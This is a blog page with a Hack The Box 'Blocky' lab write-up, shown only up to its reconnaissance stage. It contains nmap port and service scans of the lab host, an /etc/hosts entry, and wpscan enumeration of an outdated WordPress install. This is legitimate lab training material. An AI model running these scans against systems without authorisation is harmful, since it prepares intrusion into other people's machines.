@@ -1,0 +1,754 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Blocky</title> <meta name="description" content="Decompiled JAR to extract credentials"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Blocky"> <meta property="og:description" content="Decompiled JAR to extract credentials"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/17_blocky/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Blocky"> <meta name="twitter:description" content="Decompiled JAR to extract credentials"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Decompiled JAR to extract credentials"
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Blocky | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Decompiled JAR to extract credentials"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/17_blocky/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Blocky</title> <meta name="description" content="Decompiled JAR to extract credentials"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Blocky"> <meta property="og:description" content="Decompiled JAR to extract credentials"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/17_blocky/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Blocky"> <meta name="twitter:description" content="Decompiled JAR to extract credentials"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Decompiled JAR to extract credentials"
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Blocky</h1> <p class="post-description">Decompiled JAR to extract credentials</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Blocky Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Blocky" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Coming for all of Steve’s diamonds…and Blocky’s flags.</p> <p>Run nmap to get a list of available ports.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41952"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41952')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41952')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41952')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41952')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41952">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.37 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:22 AEDT
+Nmap scan report for 10.10.10.37
+Host is up (0.039s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp   open   http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://blocky.htb
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+8192/tcp closed sophos
+Device type: general purpose|storage-misc|WAP|media device
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), Synology DiskStation Manager 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
+Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.13 - 4.4 (98%), Linux 3.2 - 4.14 (94%), Linux 3.8 - 3.16 (94%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8192/tcp)
+HOP RTT      ADDRESS
+1   55.70 ms 10.10.16.1
+2   55.90 ms 10.10.10.37
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41952" onclick="terminalOverlayClose('bash-bash-41952')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41952')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41952')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41952')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41952" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.37 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:22 AEDT
+Nmap scan report for 10.10.10.37
+Host is up (0.039s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp   open   http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://blocky.htb
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+8192/tcp closed sophos
+Device type: general purpose|storage-misc|WAP|media device
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), Synology DiskStation Manager 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
+Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.13 - 4.4 (98%), Linux 3.2 - 4.14 (94%), Linux 3.8 - 3.16 (94%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8192/tcp)
+HOP RTT      ADDRESS
+1   55.70 ms 10.10.16.1
+2   55.90 ms 10.10.10.37
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
+</pre> </div> </div> <p><br> Run nmap against all of the ports to get any hidden services.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4496"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4496')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4496')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4496')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4496')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4496">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.37 
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:23 AEDT
+Nmap scan report for 10.10.10.37
+Host is up (0.016s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT      STATE  SERVICE
+21/tcp    open   ftp
+22/tcp    open   ssh
+80/tcp    open   http
+8192/tcp  closed sophos
+25565/tcp open   minecraft
+
+Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4496" onclick="terminalOverlayClose('bash-bash-4496')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4496')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4496')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4496')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4496" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.37 
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:23 AEDT
+Nmap scan report for 10.10.10.37
+Host is up (0.016s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT      STATE  SERVICE
+21/tcp    open   ftp
+22/tcp    open   ssh
+80/tcp    open   http
+8192/tcp  closed sophos
+25565/tcp open   minecraft
+
+Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
+</pre> </div> </div> <p><br> Add blocky.htb to the /etc/hosts file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-461"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-461')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-461')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-461')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-461')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-461">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ cat /etc/hosts 
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-461" onclick="terminalOverlayClose('bash-bash-461')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-461')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-461')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-461')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-461" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ cat /etc/hosts 
+</pre> </div> </div> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">/etc/hosts</span> </div> <pre class="codebox__body">
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.37     blocky.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</pre> </div> <p><br> Banner grab the port 25565 Minecraft server to get the version.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41168"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41168')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41168')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41168')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41168')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41168">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$  sudo nmap -sV -sC -p 21,22,80,8192,25565 -oN nmapspec 10.10.10.37
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:29 AEDT
+Nmap scan report for blocky.htb (10.10.10.37)
+Host is up (0.016s latency).
+
+PORT      STATE  SERVICE   VERSION
+21/tcp    open   ftp       ProFTPD 1.3.5a
+22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp    open   http      Apache httpd 2.4.18
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: BlockyCraft &amp;#8211; Under Construction!
+8192/tcp  closed sophos
+25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
+Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41168" onclick="terminalOverlayClose('bash-bash-41168')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41168')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41168')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41168')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41168" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$  sudo nmap -sV -sC -p 21,22,80,8192,25565 -oN nmapspec 10.10.10.37
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:29 AEDT
+Nmap scan report for blocky.htb (10.10.10.37)
+Host is up (0.016s latency).
+
+PORT      STATE  SERVICE   VERSION
+21/tcp    open   ftp       ProFTPD 1.3.5a
+22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp    open   http      Apache httpd 2.4.18
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: BlockyCraft &amp;#8211; Under Construction!
+8192/tcp  closed sophos
+25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
+Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
+</pre> </div> </div> <p><br> View the port 80 landing page. Looks like a Wordpress installation.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run wpscan looking for any low hanging fruit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-44227"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-44227')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-44227')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-44227')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-44227')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-44227">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ wpscan --url http://blocky.htb                
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://blocky.htb/ [10.10.10.37]
+[+] Started: Tue Jan 28 22:32:36 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://blocky.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blocky.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+ |  - http://blocky.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-11-12T00:00:00.000Z
+ | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.8
+ | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
